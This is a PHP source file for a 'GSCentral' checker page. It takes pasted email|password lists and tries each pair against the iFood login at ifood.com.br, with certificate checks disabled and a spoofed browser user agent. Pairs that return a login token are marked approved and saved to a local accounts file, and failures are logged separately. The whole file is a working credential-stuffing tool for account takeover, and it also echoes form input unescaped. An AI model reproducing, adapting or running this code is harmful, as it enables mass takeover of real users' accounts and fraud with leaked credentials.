<?php
$sock = '';
error_reporting(0);
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function GetCookie($header)
{
	// Separa o cabecalho e pega sรณ os cookies num array separado
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $header, $matches);
	$cookies = array();
	foreach($matches[1] as $item) 
	{
		parse_str($item, $cookie);
		$cookies = array_merge($cookies, $cookie);
	}
	return $cookies;
}

class cURL {

    var $callback = false;

    function setCallback($func_name) {

        $this->callback = $func_name;

    }

    function doRequest($method, $url) {

        $ch = curl_init();
		global $email, $pwd , $token;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; PT-BR; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_COOKIESESSION, true );
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/iFood.txt'); //COOKIES  DO NAVEGADOR
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/iFood.txt'); //COOKIES DO NAVEGADOR
		curl_setopt($ch, CURLOPT_REFERER, 'https://www.ifood.com.br/entrar');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'fb_access_token=&fb_email=&fb_gender=&fb_id=&fb_username=&password=' . $pwd . '&username=' . rawurlencode($email) . '');
        }
		
        $data = curl_exec($ch);

        curl_close($ch);

        if ($data) {

            if ($this->callback) {

                $callback = $this->callback;

                $this->callback = false;

                return call_user_func($callback, $data);

            } else {

                return $data;

            }

        } else {

            return curl_error($ch);

        }

    }

    function get($url) {

        return $this->doRequest('GET', $url, 'NULL');

    }

    function post($url) {

        return $this->doRequest('POST', $url);

    }

}



echo '

<DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head>

<title>GSCentral - IFOOD</title>
<link rel="icon" href="lojas/hulk.ico">
<link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap.min3f0d.css?v2.2.0">
<link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap-extend.min3f0d.css?v2.2.0">
</head>

    <script type="text/javascript">
        function pushPaypalDie(str){
            document.getElementById(\'listReprovadas\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushPaypal(str){
            document.getElementById(\'listAprovadas\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushWrongFormat(str){
            document.getElementById(\'listInvalidas\').innerHTML += \'<div>\' + str + \'</div>\';
        }
    </script>
	
	
		<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">

<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">

<link rel="icon" href="lojas/hulk.ico">
<link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap.min3f0d.css?v2.2.0">
<link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap-extend.min3f0d.css?v2.2.0">
	
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">



	
</head>
<body><center>
<div class="main-content">
<center><img src="img/centralbg.jpg"></center><br>
<br>
<H1><center>Ifood</h1><h4>GSCentral</h4>
<a href="logado.php" class="btn btn-link" role="button"><- Voltar</a>
<form method="post">
<div align="center"><textarea name="mp" rows="15" style="width:60%">';

if (isset($_POST['btn-submit']))

    echo $_POST['mp'];

else

    echo 'sualista@gmail.com|gscheckers';

;

echo '</textarea><br />
<BR>
<button type="button" class="btn btn-info">Separador:</button><br></div><input type="text" name="delim" value="';



if (isset($_POST['btn-submit']))

    echo $_POST['delim'];

else

    echo '|';

;

echo '" size="1" /><input type="hidden" name="mail" value="';

if (isset($_POST['btn-submit']))

    echo $_POST['mail'];

else

    echo 0;

;

echo '" size="1" /><input type="hidden" name="pwd" value="';

if (isset($_POST['btn-submit']))

    echo $_POST['pwd'];

else

    echo 1;

;

echo '" size="1" />&nbsp;



<input type="submit" class="btn btn-success" value="CHECAR" name="btn-submit">

</div>

</form>

';

set_time_limit(0);

include("use.php");

function fetch_value($str, $find_start, $find_end) {

    $start = strpos($str, $find_start);

    if ($start === false) {

        return "";

    }

    $length = strlen($find_start);

    $end = strpos(substr($str, $start + $length), $find_end);

    return trim(substr($str, $start + $length, $end));

}

function fetch_value_notrim($str, $find_start, $find_end) {

    $start = strpos($str, $find_start);

    if ($start === false) {

        return "";

    }

    $length = strlen($find_start);

    $end = strpos(substr($str, $start + $length), $find_end);

    return substr($str, $start + $length, $end);

}

$dir = dirname(__FILE__);

$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';

if (!file_exists($config['cookie_file'])) {

    $fp = @fopen($config['cookie_file'], 'w');

    @fclose($fp);

}

$zzz = "";

$live = array();

function get($list) {

    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);

    return $socks[0];

}

function delete_cookies() {

    global $config;

    $fp = @fopen($config['cookie_file'], 'w');

    @fclose($fp);

}

function xflush() {

    static $output_handler = null;

    if ($output_handler === null) {

        $output_handler = @ini_get('output_handler');

    }

  

   if ($output_handler == 'ob_gzhandler') {

        return;

    }

	

    flush();

    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {

        @ob_flush();

    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {

        @ob_end_flush();

        @ob_start();

    }

}

function curl_grab_page($site,$proxy,$proxystatus){

	$chss = curl_init();

	curl_setopt($chss, CURLOPT_RETURNTRANSFER, TRUE);

	if ($proxystatus == 'on') {

				curl_setopt($chss, CURLOPT_SSL_VERIFYHOST, FALSE);

				curl_setopt($chss, CURLOPT_HTTPPROXYTUNNEL, TRUE);

				curl_setopt($chss, CURLOPT_PROXY, $proxy);

			}

			curl_setopt($chss, CURLOPT_COOKIEFILE, "cookie.txt");

			curl_setopt($chss, CURLOPT_URL, $site);

			return curl_exec($chss);

			curl_close ($chss);

			

}

function display($str) {

    echo '<div>' . $str . '</div>';

    xflush();

}

//function pushSockDie($str) {

   // echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';

  //  xflush();

//}

function pushPaypalDie($str) {

    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';

	file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);  

    xflush();

}

function pushPaypal($str) {

    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';

	file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);  

    xflush();

}

function pushWrongFormat($str) {

    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';

    xflush();

}



if (isset($_POST['btn-submit'])) {

    ;

    echo '<br/>


<br/>
<center>
                                    <div class="panel panel-green">
</span>
                                   <legend class="tvmit_live">✔ Aprovasdas<br/><div id="listAprovadas"></div></legend>
								   <legend class="tvmit_live"><br/><div id="listAprovadas"></div></legend>
								   <div class="panel-body">
</div>  
                            <div class="panel panel-danger">
                                    <div class="alert alert-danger">✘ Reprovadas<br/><div id="pushPaypalDie"></div>
<legend class="tvmit_die"><br/><div id="listReprovadas"></div></legend><br>

<br/>
<br>
<br>								
<br>
                                    <div class="panel panel-danger">
									<br>
                                    <div class="alert alert-danger">✘ Invalidas<br/><div id="pushWrongFormat"></div>
<legend class="tvmit_die"><br/><div id="listInvalidas"></div></legend>
</center>




';

    xflush();

    $emails = explode("\n", trim($_POST['mp']));

    $eCount = count($emails);

    $failed = $live = $uncheck = array();

    $checked = 0;

    if (!count($emails)) {

        continue;

    }

    delete_cookies();

    //$sockClear = isSockClear();

    //if ($sockClear != 1) {

        //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');

        //continue;

    //}



    foreach ($emails AS $k => $line) {

        $info = explode($_POST['delim'], $line);

        $email = trim($info["{$_POST['mail']}"]);

        $pwd = trim($info["{$_POST['pwd']}"]);

        if (stripos($email, '@') === false || strlen($pwd) < 2) {

            unset($emails[$k]);

            pushWrongFormat($email . ' | ' . $pwd);

            continue;

        }

        //if ($failed[$sock] > 4)

         //   continue;

	 

	 

	 //DELETAR COOKIES

if(file_exists(getcwd().'/iFood.txt')) {

        unlink(getcwd().'/iFood.txt'); 

    }

	//FIM COOKIES

	

	//CHAMADAS DE TOKEN E POST

	       $e = new cURL();
           $f = $e->get("https://www.ifood.com.br/entrar");
           $g = new cURL();
           $h = $g->post("https://www.ifood.com.br/entrar");
		   
		   $x = GetCookie($h);

    

$checked++;



 

	if($h){

	

	//RESULTADOS DE CAPUTRA


		if($x['cookie_login_token'] != '') {

			/*$cc = getStr($d,'class="editAddress"',',');

			$cc1 = str_replace(' \r\n','',$cc);

			$cc2 = getStr($d,'"city":',',');

			$cc3 = str_replace(' \r\n','',$cc2);

			$cc4 = getStr($d,'"job":',',');

			$cc5 = str_replace(' \r\n','',$cc4);*/

    

            

			$xyz = "<p><center><b style=\"color:green\">✔ </b>$email | $pwd <b style=\"color:green\">| #GSCheckers </b></p></center>";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);			
			}

else{				
				pushPaypalDie("<b style=\"color:red\">✘ </b>$email | $pwd ");			
			unset($emails[$k]);						 
			}   

        

	}

	}

}

//if (isset($eCount, $live)) {

//    display("<h3>Total: $eCount - Testado: $checked - Aprovado: " . count($live) . "</h5>");

//    display(implode("<br />", $live));

    if (count($emails)) {

        display("Sem Testar:");

        display('<textarea cols="80" rows="10">' . implode("\n", $emails) . '</textarea>');

    }



echo '</body>

</html>';